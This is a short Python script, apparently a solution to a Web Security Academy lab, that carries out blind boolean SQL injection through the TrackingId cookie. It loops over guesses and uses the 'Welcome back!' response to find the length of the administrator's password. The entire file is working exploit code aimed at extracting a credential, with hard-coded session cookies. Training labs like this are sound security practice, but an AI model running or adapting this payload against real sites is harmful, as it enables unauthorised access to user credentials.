import requests

url = 'https://0a3500610308a65f800b8a94002b005e.web-security-academy.net/filter?category=Pets'

def get_length():
    for i in range(1, 101):
        cookie = {
            'TrackingId': 'ZI8Z1ps5YcjvDJzX',
            'session': 'lFKwgHF8bS3Y7TqH7h6uOogWDM1eDYNr'
        }
        
        payload = f"' AND LENGTH((SELECT password FROM users WHERE username='administrator')) = {i}--"
        cookie['TrackingId'] = cookie['TrackingId'] + payload
        
        r = requests.get(url, cookies=cookie)
        
        if 'Welcome back!' in r.text:
            return i

length = get_length()
print(f"Password Length: {length}")